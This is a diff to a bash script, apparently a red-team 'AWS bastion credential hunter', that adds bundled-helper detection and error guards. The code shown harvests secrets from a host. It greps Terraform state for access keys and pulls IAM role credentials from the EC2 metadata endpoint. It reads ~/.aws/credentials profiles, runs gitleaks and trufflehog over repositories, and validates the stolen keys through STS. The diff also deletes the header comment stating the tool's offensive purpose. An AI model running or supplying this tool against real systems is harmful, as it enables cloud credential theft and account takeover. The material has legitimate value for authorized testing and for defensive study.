@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
 #
-# awshawk.sh
-# AWS bastion credential hunter for red team operations
 #
 set -euo pipefail
+
+shopt -s nullglob
 
 print_banner() {
   cat <<'BANNER'
@@ -67,11 +67,44 @@ MAX_DEPTH="${MAX_DEPTH:-8}"
 MAX_SIZE_BYTES="${MAX_SIZE_BYTES:-5242880}"   # 5 MiB
 SCAN_BINARIES="${SCAN_BINARIES:-false}"
 
-# Helper detection
-HAS_TRUFFLEHOG=false; command -v trufflehog >/dev/null 2>&1 && HAS_TRUFFLEHOG=true || true
-HAS_GITLEAKS=false;   command -v gitleaks   >/dev/null 2>&1 && HAS_GITLEAKS=true   || true
-HAS_AWSCLI=false;     command -v aws        >/dev/null 2>&1 && HAS_AWSCLI=true     || true
-HAS_JQ=false;         command -v jq         >/dev/null 2>&1 && HAS_JQ=true         || true
+# Preferred helper binary paths (prefer ./helper/*)
+TRUFFLEHOG_BIN="${HELPER_DIR}/trufflehog"
+GITLEAKS_BIN="${HELPER_DIR}/gitleaks"
+JQ_BIN="${HELPER_DIR}/jq"
+AWSCLI_BIN="${HELPER_DIR}/aws"
+
+# Helper detection with fallback to system binaries
+HAS_TRUFFLEHOG=false
+if [ -x "${TRUFFLEHOG_BIN}" ]; then
+  HAS_TRUFFLEHOG=true
+elif command -v trufflehog >/dev/null 2>&1; then
+  TRUFFLEHOG_BIN="$(command -v trufflehog)"
+  HAS_TRUFFLEHOG=true
+fi
+
+HAS_GITLEAKS=false
+if [ -x "${GITLEAKS_BIN}" ]; then
+  HAS_GITLEAKS=true
+elif command -v gitleaks >/dev/null 2>&1; then
+  GITLEAKS_BIN="$(command -v gitleaks)"
+  HAS_GITLEAKS=true
+fi
+
+HAS_JQ=false
+if [ -x "${JQ_BIN}" ]; then
+  HAS_JQ=true
+elif command -v jq >/dev/null 2>&1; then
+  JQ_BIN="$(command -v jq)"
+  HAS_JQ=true
+fi
+
+HAS_AWSCLI=false
+if [ -x "${AWSCLI_BIN}" ]; then
+  HAS_AWSCLI=true
+elif command -v aws >/dev/null 2>&1; then
+  AWSCLI_BIN="$(command -v aws)"
+  HAS_AWSCLI=true
+fi
 
 # -----------------------------
 # Arg parsing
@@ -158,6 +191,11 @@ log "Start (wide=${SCAN_WIDE}, depth=${MAX_DEPTH}, max_size=${MAX_SIZE_BYTES}, s
   echo "hostname: $(hostname -f 2>/dev/null || hostname)"
   echo "kernel: $(uname -a)"
   echo "helpers: trufflehog=${HAS_TRUFFLEHOG} gitleaks=${HAS_GITLEAKS} awscli=${HAS_AWSCLI} jq=${HAS_JQ}"
+  # Log actual binary paths used (if any)
+  echo "TRUFFLEHOG_BIN=${TRUFFLEHOG_BIN:-<none>}"
+  echo "GITLEAKS_BIN=${GITLEAKS_BIN:-<none>}"
+  echo "JQ_BIN=${JQ_BIN:-<none>}"
+  echo "AWSCLI_BIN=${AWSCLI_BIN:-<none>}"
 } > "${OUTDIR}/basic_info.txt"
 
 # -----------------------------
@@ -216,28 +254,48 @@ if [ "$DO_TERRAFORM" = true ]; then
     [ -d "$p" ] || continue
     find "$p" -xdev -maxdepth "$MAX_DEPTH" -type f -readable 2>/dev/null \
       \( -name '*.tfstate' -o -name '*.tfstate.backup' -o -name '*.tfvars' -o -name 'terraform.tfvars*' \) \
-      >> "${TF_OUT_DIR}/tf_candidates.txt"
+      >> "${TF_OUT_DIR}/tf_candidates.txt" || true
   done
 
-  while read -r f; do
-    [ -n "$f" ] || continue
-    base="$(echo "$f" | tr '/ ' '__')"
-    # Copy small file for evidence
-    if [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -le "$MAX_SIZE_BYTES" ]; then
-      copy_if_readable "$f" "terraform/samples/${base}"
-    fi
-    if [ "$HAS_JQ" = "true" ] && file "$f" 2>/dev/null | grep -qi 'json'; then
-      jq 'paths | map(tostring) | join(".")' "$f" > "${TF_OUT_DIR}/${base}.paths.txt" 2>/dev/null || true
-      for key in access_key secret_key token akid aws_access_key_id aws_secret_access_key aws_session_token; do
-        jq -r ".. | .\"$key\"? // empty" "$f" 2>/dev/null | sed 's/^/VAL: /' >> "${TF_OUT_DIR}/${base}.secrets.txt" || true
-      done
-      jq -r '.. | objects | select(has("type")) | .type' "$f" 2>/dev/null | sort -u > "${TF_OUT_DIR}/${base}.types.txt" || true
-    else
-      grep -nEi 'aws_access_key_id|aws_secret_access_key|session_token|access.?key|secret.?key|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$f" \
-        > "${TF_OUT_DIR}/${base}.secrets.grep.txt" 2>/dev/null || true
-      grep -nEi '"type"\s*:\s*"aws_[a-z_]+"' "$f" > "${TF_OUT_DIR}/${base}.types.grep.txt" 2>/dev/null || true
-    fi
-  done < "${TF_OUT_DIR}/tf_candidates.txt"
+  # Avoid reading if file is empty or missing (this previously caused set -e to exit in some envs)
+  if [ -s "${TF_OUT_DIR}/tf_candidates.txt" ]; then
+    while IFS= read -r f; do
+      [ -n "$f" ] || continue
+      # guard in case file vanished between find and processing
+      [ -r "$f" ] || continue
+      base="$(echo "$f" | tr '/ ' '__')"
+      # Copy small file for evidence
+      if [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -le "$MAX_SIZE_BYTES" ]; then
+        copy_if_readable "$f" "terraform/samples/${base}"
+      fi
+
+      # If jq available and file appears to be JSON, use jq (guarded)
+      if [ "${HAS_JQ}" = "true" ]; then
+        if file "$f" 2>/dev/null | grep -qi 'json'; then
+          # run jq guarded; if jq fails we continue
+          {
+            "${JQ_BIN}" 'paths | map(tostring) | join(".")' "$f" > "${TF_OUT_DIR}/${base}.paths.txt" 2>/dev/null || true
+            for key in access_key secret_key token akid aws_access_key_id aws_secret_access_key aws_session_token; do
+              "${JQ_BIN}" -r ".. | .\"$key\"? // empty" "$f" 2>/dev/null | sed 's/^/VAL: /' >> "${TF_OUT_DIR}/${base}.secrets.txt" || true
+            done
+            "${JQ_BIN}" -r '.. | objects | select(has("type")) | .type' "$f" 2>/dev/null | sort -u > "${TF_OUT_DIR}/${base}.types.txt" 2>/dev/null || true
+          } || true
+        else
+          # fallback grep if not JSON
+          grep -nEi 'aws_access_key_id|aws_secret_access_key|session_token|access.?key|secret.?key|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$f" \
+            > "${TF_OUT_DIR}/${base}.secrets.grep.txt" 2>/dev/null || true
+          grep -nEi '"type"\s*:\s*"aws_[a-z_]+"' "$f" > "${TF_OUT_DIR}/${base}.types.grep.txt" 2>/dev/null || true
+        fi
+      else
+        # jq not available: use grep-only path
+        grep -nEi 'aws_access_key_id|aws_secret_access_key|session_token|access.?key|secret.?key|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$f" \
+          > "${TF_OUT_DIR}/${base}.secrets.grep.txt" 2>/dev/null || true
+        grep -nEi '"type"\s*:\s*"aws_[a-z_]+"' "$f" > "${TF_OUT_DIR}/${base}.types.grep.txt" 2>/dev/null || true
+      fi
+    done < "${TF_OUT_DIR}/tf_candidates.txt"
+  else
+    log "No terraform candidates found (skipping processing step)"
+  fi
 fi
 
 # -----------------------------
@@ -277,21 +335,21 @@ if [ "$DO_IMDS" = true ]; then
   log "IMDS query"
   IMDS_OUT="${OUTDIR}/imds.txt"
   set +e
-  TOKEN="$(curl -sS -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' -m 5 2>/dev/null)"
+  TOKEN="$(curl -sS -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' -m 5 2>/dev/null || true)"
   if [ -n "${TOKEN}" ]; then
     {
       echo "IMDSv2 token obtained"
-      ROLE="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 5 2>/dev/null)"
+      ROLE="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 5 2>/dev/null || true)"
       echo "Role: ${ROLE:-<none>}"
       if [ -n "$ROLE" ]; then
-        CREDS_JSON="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -m 5 2>/dev/null)"
+        CREDS_JSON="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -m 5 2>/dev/null || true)"
         echo "Credentials JSON (first 2000 chars):"; echo "${CREDS_JSON}" | cut -c1-2000
         echo "${CREDS_JSON}" > "${OUTDIR}/imds_creds.json"
-        [ "$HAS_JQ" = "true" ] && jq . "${OUTDIR}/imds_creds.json" > "${OUTDIR}/imds_creds.pretty.json" 2>/dev/null || true
+        [ "${HAS_JQ}" = "true" ] && { "${JQ_BIN}" . "${OUTDIR}/imds_creds.json" > "${OUTDIR}/imds_creds.pretty.json" 2>/dev/null || true; }
       fi
     } > "${IMDS_OUT}"
   else
-    { echo "IMDSv2 token not obtained; trying IMDSv1..."; curl -sS 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 3 || echo "IMDSv1 unreachable"; } > "${IMDS_OUT}"
+    { echo "IMDSv2 token not obtained; trying IMDSv1..."; curl -sS 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 3 2>/dev/null || echo "IMDSv1 unreachable"; } > "${IMDS_OUT}" || true
   fi
   set -e
 fi
@@ -315,21 +373,26 @@ if [ "$DO_REPOS" = true ]; then
   mapfile -t REPO_DIRS < <(printf "%s\n" "${REPO_DIRS[@]}" | awk 'NF && !x[$0]++')
   printf "%s\n" "${REPO_DIRS[@]}" > "${REPO_TARGETS}"
 
-  if [ "$HAS_GITLEAKS" = true ]; then
-    log "Running gitleaks on ${#REPO_DIRS[@]} target(s)"
+  if [ "${HAS_GITLEAKS}" = "true" ]; then
+    log "Running gitleaks on ${#REPO_DIRS[@]} target(s) using ${GITLEAKS_BIN}"
     for d in "${REPO_DIRS[@]}"; do
       outj="${OUTDIR}/gitleaks-$(echo "$d" | tr '/ ' '__').json"
-      gitleaks detect --source="$d" --report-path="$outj" 2>>"${OUTDIR}/gitleaks.err" || true
+      # guard: run gitleaks but don't fail the whole script on errors
+      set +e
+      "${GITLEAKS_BIN}" detect --source="$d" --report-path="$outj" 2>>"${OUTDIR}/gitleaks.err" || true
+      set -e
     done
   else
     log "gitleaks not bundled — skipping"
   fi
 
-  if [ "$HAS_TRUFFLEHOG" = true ]; then
-    log "Running trufflehog filesystem on repo roots"
+  if [ "${HAS_TRUFFLEHOG}" = "true" ]; then
+    log "Running trufflehog filesystem on repo roots using ${TRUFFLEHOG_BIN}"
     for d in "${REPO_DIRS[@]}"; do
       outj="${OUTDIR}/trufflehog-$(echo "$d" | tr '/ ' '__').json"
-      trufflehog filesystem "$d" --json > "$outj" 2>>"${OUTDIR}/trufflehog.err" || true
+      set +e
+      "${TRUFFLEHOG_BIN}" filesystem "$d" --json > "$outj" 2>>"${OUTDIR}/trufflehog.err" || true
+      set -e
     done
   else
     log "trufflehog not bundled — skipping"
@@ -339,17 +402,18 @@ fi
 # -----------------------------
 # 8) Optional STS validation (authorized only)
 # -----------------------------
-if [ "$DO_STS" = true ] && [ "$HAS_AWSCLI" = true ]; then
-  log "STS read-only identity checks (authorized only)"
+if [ "$DO_STS" = true ] && [ "${HAS_AWSCLI}" = "true" ]; then
+  log "STS read-only identity checks (authorized only) using ${AWSCLI_BIN}"
   # env creds
   if env | egrep -qi 'AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN'; then
-    aws sts get-caller-identity --output json > "${OUTDIR}/sts_env.json" 2>"${OUTDIR}/sts_env.err" || true
+    AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY_ID:-}" AWS_SECRET_ACCESS_KEY="${AWS_SECRET_ACCESS_KEY:-}" AWS_SESSION_TOKEN="${AWS_SESSION_TOKEN:-}" \
+      "${AWSCLI_BIN}" sts get-caller-identity --output json > "${OUTDIR}/sts_env.json" 2>"${OUTDIR}/sts_env.err" || true
   fi
   # profiles
   if [ -f "$HOME/.aws/credentials" ]; then
     awk -F '[][]' '/\[/{print $2}' "$HOME/.aws/credentials" | while read -r prof; do
       [ -n "$prof" ] || continue
-      AWS_PROFILE="$prof" aws sts get-caller-identity --output json > "${OUTDIR}/sts_profile_${prof}.json" 2>"${OUTDIR}/sts_profile_${prof}.err" || true
+      AWS_PROFILE="$prof" "${AWSCLI_BIN}" sts get-caller-identity --output json > "${OUTDIR}/sts_profile_${prof}.json" 2>"${OUTDIR}/sts_profile_${prof}.err" || true
     done
   fi
   # imds temp creds if captured
@@ -359,7 +423,7 @@ if [ "$DO_STS" = true ] && [ "$HAS_AWSCLI" = true ]; then
     STOK="$(grep -Eo '"Token"\s*:\s*"[^"]+"' "${OUTDIR}/imds_creds.json" | head -n1 | cut -d'"' -f4 || true)"
     if [ -n "$AKID" ] && [ -n "$SKEY" ] && [ -n "$STOK" ]; then
       AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKEY" AWS_SESSION_TOKEN="$STOK" \
-        aws sts get-caller-identity --output json > "${OUTDIR}/sts_imds.json" 2>"${OUTDIR}/sts_imds.err" || true
+        "${AWSCLI_BIN}" sts get-caller-identity --output json > "${OUTDIR}/sts_imds.json" 2>"${OUTDIR}/sts_imds.err" || true
     fi
   fi
 fi
@@ -393,6 +457,7 @@ fi
 
 # Terraform artifacts
 if [ -d "${OUTDIR}/terraform" ]; then
+  # handle secrets.grep.txt entries
   find "${OUTDIR}/terraform" -type f -name '*.secrets.grep.txt' -readable 2>/dev/null | while read -r f; do
     src=$(basename "$f" | sed 's/\.secrets\.grep\.txt$//')
     while IFS= read -r line; do
@@ -402,6 +467,7 @@ if [ -d "${OUTDIR}/terraform" ]; then
       printf "terraform,content,\"%s\",%s,\"%s\"\n" "$src" "${ln_no:-}" "$detail" >> "$INDEX"
     done < "$f"
   done
+  # handle .secrets.txt (jq path)
   find "${OUTDIR}/terraform" -type f -name '*.secrets.txt' -readable 2>/dev/null | while read -r f; do
     src=$(basename "$f" | sed 's/\.secrets\.txt$//')
     while IFS= read -r val; do
@@ -412,11 +478,11 @@ if [ -d "${OUTDIR}/terraform" ]; then
   done
 fi
 
-# gitleaks JSON
-if command -v jq >/dev/null 2>&1; then
+# gitleaks JSON (guarded: require jq)
+if [ "${HAS_JQ}" = "true" ]; then
   for j in "${OUTDIR}"/gitleaks-*.json; do
     [ -f "$j" ] || continue
-    jq -r '
+    "${JQ_BIN}" -r '
       .[]? | [
         "gitleaks",
         ( .RuleID // "rule" ),
@@ -428,12 +494,12 @@ if command -v jq >/dev/null 2>&1; then
   done
 fi
 
-# trufflehog JSON (line-delimited)
-if command -v jq >/dev/null 2>&1; then
+# trufflehog JSON (line-delimited) (guarded)
+if [ "${HAS_JQ}" = "true" ]; then
   for j in "${OUTDIR}"/trufflehog-*.json; do
     [ -f "$j" ] || continue
     while IFS= read -r line; do
-      echo "$line" | jq -r '
+      echo "$line" | "${JQ_BIN}" -r '
         [
           "trufflehog",
           ( .Rule // "rule" ),
@@ -562,5 +628,5 @@ log "Done. Results: ${OUTDIR}"
 echo "Tips:"
 echo " - Keep raw evidence confidential; share 'FINDINGS.md' or 'summary.redacted.txt' if needed."
 echo " - To scan EVERYTHING readable: add -wide and tune MAX_DEPTH/MAX_SIZE_BYTES."
-echo " - For authorized identity checks: add -sts (requires ./helper/aws)."
+echo " - For authorized identity checks: add -sts (requires ./helper/aws or system aws)."
 exit 0
